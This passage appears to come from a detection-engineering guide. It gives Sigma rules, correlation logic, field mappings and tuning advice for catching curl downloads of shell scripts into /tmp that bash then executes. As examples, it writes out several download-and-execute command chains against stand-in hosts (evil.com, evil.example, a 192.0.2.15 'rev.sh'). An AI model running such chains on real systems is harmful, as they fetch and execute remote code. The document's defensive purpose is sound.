  bash_execute_script_from_tmp:
    title: Bash Executes Script From Temporary Path
    logsource:
      product: linux
      category: process_creation
    detection:
      selection:
        Image|endswith:
          - '/bash'
          - '/sh'
          - '/dash'
        CommandLine|re: '(?:/tmp|/var/tmp|/dev/shm)/[^\\s]+\\.sh'
      condition: selection
    fields:
      - CommandLine
      - ParentCommandLine

transformations:
  - field: CommandLine
    target: ScriptPath
    type: regex
    pattern: '(/(?:tmp|var/tmp|dev/shm)/[^\\s]+\\.sh)'

correlation:
  rules:
    - curl_download_bash_script_to_tmp
    - bash_execute_script_from_tmp
  timeframe: 5m
  condition: all
  group_by:
    - host.name
    - ScriptPath

falsepositives:
  - Legitimate installer scripts
  - Software update scripts
  - CI/CD pipelines
  - Container bootstrap scripts
  - Admin deployment tools

level: high

tags:
  - attack.command_and_control.t1105
  - attack.execution.t1059.004
```

---

## How this rule works

### Sub-event 1: curl writes a Bash script to a temporary directory

This detects `curl` creating/modifying a `.sh` file under one of these paths:

- `/tmp/`
- `/var/tmp/`
- `/dev/shm/`

This should fire on activity like:

```bash
curl http://evil.example/x.sh -o /tmp/x.sh
```

or

```bash
curl -o /tmp/x.sh https://evil.example/x.sh
```

or

```bash
curl https://evil.example/x.sh > /tmp/x.sh
```

---

### Sub-event 2: bash executes a `.sh` file from the same temporary path

This detects execution of Bash scripts located in `/tmp`, `/var/tmp`, or `/dev/shm`.

This should fire on activity like:

```bash
bash /tmp/x.sh
```

or

```bash
sh /tmp/x.sh
```

or

```bash
dash /tmp/x.sh
```

---

### Correlation logic

Alert when:

- `host.name` matches
- the same normalized `.sh` path is observed in both events
- the bash execution occurs within **5 minutes** of the curl write event

This reduces false positives caused by unrelated script writes and unrelated script executions.

---

## Simpler single-event variant if correlation is not supported

If your log source only supports one process event and cannot correlate events, use this command-line rule. It catches one-shot commands where both download and execution occur in the same command.

```yaml
title: Curl Downloads Bash Script and Executes It in One Command
description: >
  Detects command lines where curl downloads a .sh script into /tmp (or /var/tmp or /dev/shm)
  and the same command executes that script using bash or sh.
  Example: curl -o /tmp/x.sh https://evil.example/x.sh && bash /tmp/x.sh

status: experimental

references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/

author: Detection Engineering
date: 2025-10-26

logsource:
  product: linux
  category: process_creation

detection:
  selection_curl_download:
    CommandLine|re: 'curl\\s+.*(?:-o\\s+|--output\\s+=\\s*|--output\\s+|>\\s+)(?:/tmp|/var/tmp|/dev/shm)/[^\\s]+\\.sh'

  selection_shell_execute:
    CommandLine|re: '(?:/usr/(?:bin|local/bin)/)?(?:bash|sh|dash)\\s+(?:-c\\s+)?(?:source\\s+|exec\\s+)?\"?(?:/tmp|/var/tmp|/dev/shm)/[^\\s]+\\.sh\"?'

  condition: selection_curl_download and selection_shell_execute

falsepositives:
  - Legitimate bootstrap scripts
  - Software installers
  - Update mechanisms

level: high

tags:
  - attack.command_and_control.t1105
  - attack.execution.t1059.004
```

## Example malicious command chains this detects

### Command chain 1
```bash
curl -o /tmp/update.sh https://example.com/update.sh
bash /tmp/update.sh
```

### Command chain 2
```bash
curl http://192.0.2.15/rev.sh -o /tmp/rev.sh && chmod +x /tmp/rev.sh && bash /tmp/rev.sh
```

### Command chain 3
```bash
bash -c 'curl -o /tmp/x.sh https://evil.com/x.sh && bash /tmp/x.sh'
```

### Command chain 4
```bash
curl https://evil.com/script.sh > /tmp/script.sh
sh /tmp/script.sh
```

## Platform-specific mapping suggestions

Because field names vary by telemetry source, map the following logical fields:

### Sigma fields
- `Image` → process executable path
- `CommandLine` → full command line
- `TargetFilename` → file path created or modified by the process

### Elastic / Common Schema
- `process.executable`
- `process.command_line`
- `file.path`

### Sysmon for Linux
- `Image`
- `CommandLine`
- `TargetFilename`

### Auditd
You will usually need:
- syscall/execve for process creation
- file path information for writes to `/tmp`

### Splunk / OSSEC / Wazuh examples
Map equivalent fields such as:
- `process.name`
- `process.args`
- `file.path`

## Optional hardening of the rule

You can expand the rule to be more aggressive by adding:

### 1. Include other common downloaders
If you also want to detect `wget`, add:

```yaml
Image|endswith:
  - '/curl'
  - '/wget'
```

Then adjust the command-line logic for:
- `wget -O /tmp/x.sh ...`
- `wget https://evil.example/x.sh -O /tmp/x.sh`

---

### 2. Include direct execution from /tmp
Many malware variants do:

```bash
curl -o /tmp/x.sh https://evil.example/x.sh
chmod +x /tmp/x.sh
/tmp/x.sh
```

If you want to detect that too, add a sub-event:

```yaml
Image|startswith: '/tmp/'
```

or for Elastic:

```kql
process.executable: /tmp/*.sh
```

---

### 3. Detect shell input redirection
Add support for:

```bash
bash < /tmp/x.sh
sh < /tmp/x.sh
```

A broader regex example:

```yaml
CommandLine|re: '(?:bash|sh|dash)\\s*<\\s*(?:/tmp|/var/tmp|/dev/shm)/[^\\s]+\\.sh'
```

---

## Tuning guidance

Because `/tmp` is heavily used by legitimate processes, you may need to tune this rule in production.

### Recommended filters
Add filters for known benign:
- package managers
- container runtime initialization
- cloud-init scripts
- legitimate update agents
- CI runners

Example filter concept:

```yaml
filter:
  ParentImage|contains:
    - '/apt/'
    - '/dnf/'
    - '/yum/'
    - '/pacman/'
    - '/snap/'
```

### Better correlation field
If your SIEM supports normalization, correlate on:

- `host.name`
- `user.name`
- resolved script path (`realpath` if possible)

This reduces false positives from multiple unrelated `.sh` files.
